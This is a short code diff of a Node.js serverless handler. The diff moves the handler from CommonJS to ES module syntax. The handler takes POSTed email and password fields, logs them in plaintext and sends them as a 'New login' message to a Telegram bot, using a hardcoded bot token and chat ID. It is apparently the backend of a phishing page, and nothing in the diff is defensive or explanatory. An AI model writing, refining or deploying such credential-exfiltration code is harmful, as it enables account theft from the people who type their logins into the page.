@@ -1,6 +1,6 @@
-const fetch = require('node-fetch');
+import fetch from 'node-fetch';
 
-module.exports = async (req, res) => {
+export default async function handler(req, res) {
     if (req.method === 'POST') {
         try {
             const { email, password } = req.body;
@@ -9,8 +9,8 @@ module.exports = async (req, res) => {
             console.log('Received credentials:', { email, password });
 
             // Send credentials to Telegram bot
-            const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
-            const chatId = '7587120060'; // Replace with your actual chat ID
+            const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Your Telegram bot token
+            const chatId = '7587120060'; // Your Telegram chat ID
             const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
             const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
             console.log('Sending message to Telegram:', telegramUrl);
@@ -31,4 +31,4 @@ module.exports = async (req, res) => {
     } else {
         res.status(405).json({ error: 'Method not allowed' });
     }
-};
+}
